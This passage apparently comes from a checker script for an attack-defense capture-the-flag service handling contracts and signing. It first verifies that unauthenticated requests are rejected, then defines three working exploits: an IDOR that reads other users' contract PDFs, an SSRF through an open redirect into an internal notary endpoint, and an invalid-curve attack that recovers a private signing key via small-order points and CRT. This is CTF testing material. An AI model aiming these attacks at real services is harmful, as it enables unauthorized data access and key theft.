        raise MumbleException(f"Unknown-account login was not rejected: HTTP {status}")

    logger.debug("Checking that /api/me rejects missing authentication")
    status, _data = await client.request_json("GET", "/api/me")
    if status != 401:
        raise MumbleException(f"Unauthenticated /api/me was not rejected: HTTP {status}")

    logger.debug("Checking that contract listing rejects missing authentication")
    status, _data = await client.request_json("GET", "/api/contracts")
    if status != 401:
        raise MumbleException(f"Unauthenticated contract listing was not rejected: HTTP {status}")

    logger.debug("Checking that contract creation rejects missing authentication")
    status, _data = await client.request_json(
        "POST",
        "/api/contracts",
        {
            "title": "Rejected Contract " + random_suffix(12),
            "content": "stateless rejection check " + random_suffix(24),
        },
    )
    if status != 401:
        raise MumbleException(f"Unauthenticated contract creation was not rejected: HTTP {status}")

    logger.debug("Checking that invalid registration input is rejected")
    status, _data = await client.request_json(
        "POST",
        "/api/register",
        {
            "username": "x",
            "password": "tiny",
        },
    )
    if status != 400:
        raise MumbleException(f"Invalid registration input was not rejected: HTTP {status}")

    logger.debug("Checking that an unknown public holder returns not found")
    status, _data = await client.public_contracts_by_username("missing_" + random_suffix(12))
    if status != 404:
        raise MumbleException(f"Unknown public holder did not return not found: HTTP {status}")

    logger.debug("Checking that malformed public holder input is rejected")
    status, _data = await client.request_json("GET", "/api/users/%20/contracts")
    if status != 400:
        raise MumbleException(f"Malformed public holder lookup was not rejected: HTTP {status}")


@checker.exploit(0)
async def exploit_checksum_idor(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()

    logger.debug("Registering attacker account")
    _user_id, _username, token = await client.register_user(username, password)

    target_usernames = extract_usernames_from_hints(task)
    if not target_usernames:
        raise MumbleException("Checker task did not contain target metadata")

    logger.debug("Resolving %d target usernames via public contract metadata", len(target_usernames))
    for target_username in target_usernames:
        status, data = await client.public_contracts_by_username(target_username)

        if status == 404:
            continue
        if status != 200:
            logger.debug("Skipping username %s because metadata returned HTTP %s", target_username, status)
            continue
        if not isinstance(data, dict):
            continue

        public_username = data.get("username")
        if not isinstance(public_username, str) or not public_username:
            public_username = target_username

        contracts = data.get("contracts")
        if not isinstance(contracts, list):
            continue

        for contract in contracts:
            if not isinstance(contract, dict):
                continue

            reference = reference_from_public_contract(public_username, contract)
            if reference is None:
                continue

            status, latest_data = await client.latest_contract_version(token, reference)
            if status == 200:
                latest_bytes = json.dumps(latest_data, ensure_ascii=False).encode("utf-8")
                if flag := searcher.search_flag(latest_bytes):
                    return flag

            status, pdf_bytes, _headers = await client.latest_contract_pdf(token, reference)
            if status != 200:
                continue

            if flag := searcher.search_flag(pdf_bytes):
                return flag

    raise MumbleException("flag not found")


@checker.exploit(1)
async def exploit_annex_notary(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()

    logger.debug("Registering attacker account")
    _user_id, _username, token = await client.register_user(username, password)

    target_usernames = extract_usernames_from_hints(task)
    if not target_usernames:
        raise MumbleException("Checker task did not contain target metadata")

    logger.debug("Resolving %d target usernames via public archive metadata", len(target_usernames))
    for target_username in target_usernames:
        status, data = await client.public_contracts_by_username(target_username)

        if status == 404:
            continue
        if status != 200:
            logger.debug("Skipping username %s because metadata returned HTTP %s", target_username, status)
            continue
        if not isinstance(data, dict):
            continue

        contracts = data.get("contracts")
        if not isinstance(contracts, list):
            continue

        for contract in contracts:
            if not isinstance(contract, dict):
                continue

            notary_stamp = contract.get("notaryStamp")
            if not isinstance(notary_stamp, str) or not notary_stamp:
                continue

            internal_url = (
                f"http://127.0.0.1:{SERVICE_PORT}/internal/notary/sealed/"
                f"{parse.quote(notary_stamp, safe='')}"
            )
            redirect_url = (
                f"{client.base_url}/api/links/leave?to="
                f"{parse.quote(internal_url, safe='')}"
            )
            annex_content = (
                '<link rel="attachment" title="sealed-record.txt" '
                f'href="{redirect_url}">'
            )

            created = await client.create_contract(
                token,
                "Certified Evidence Review " + random_suffix(12),
                annex_content,
            )
            attacker_reference = get_string_field(created, "reference", "attacker contract creation response")

            status, pdf_bytes, _headers = await client.latest_contract_pdf(token, attacker_reference)
            if status != 200:
                logger.debug("Skipping stamp because PDF returned HTTP %s", status)
                continue
            if b"/EmbeddedFiles" not in pdf_bytes:
                continue

            if flag := searcher.search_flag(pdf_bytes):
                return flag

    raise MumbleException("flag not found")


@checker.exploit(2)
async def exploit_faulty_curve_signing(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()

    logger.debug("Registering attacker account")
    _user_id, _username, token = await client.register_user(username, password)

    target_usernames = extract_usernames_from_hints(task)
    if not target_usernames:
        raise MumbleException("Checker task did not contain target metadata")

    logger.debug("Resolving %d target usernames via public signing metadata", len(target_usernames))
    for target_username in target_usernames:
        status, data = await client.public_signing_authorities_by_username(target_username)

        if status == 404:
            continue
        if status != 200:
            logger.debug("Skipping username %s because signing metadata returned HTTP %s", target_username, status)
            continue
        if not isinstance(data, dict):
            continue

        authorities = data.get("authorities")
        if not isinstance(authorities, list):
            continue

        for authority in authorities:
            if not isinstance(authority, dict):
                continue

            authority_id = authority.get("authorityId")
            secret_blob = authority.get("secretBlob")
            curve_name = authority.get("curveName")
            if not isinstance(authority_id, str) or not isinstance(secret_blob, str):
                continue
            if curve_name != SIGNING_CURVE_NAME:
                continue

            residues: list[tuple[int, int]] = []
            for order, x, y in SIGNING_ATTACK_POINTS:
                status, ceremony_data = await client.create_signature_ceremony(
                    token,
                    authority_id,
                    "fault review " + random_suffix(16),
                    base_point=(x, y),
                )
                if status not in (200, 201):
                    logger.debug("Faulty signing point was rejected with HTTP %s", status)
                    residues = []
                    break

                ceremony_obj = require_json_object(ceremony_data, "faulty signature ceremony response")
                signature_point = parse_service_point(ceremony_obj.get("signaturePoint"))
                residue = discrete_log_small_order((x, y), signature_point, order)
                residues.append((residue, order))

            if not residues:
                continue

            private_scalar = crt(residues)
            if not (0 < private_scalar < SIGNING_SCALAR_LIMIT):
                continue

            secret_bytes = decrypt_signing_secret(authority_id, private_scalar, secret_blob)
            if flag := searcher.search_flag(secret_bytes):
                return flag

    raise MumbleException("flag not found")


if __name__ == "__main__":
    checker.run()
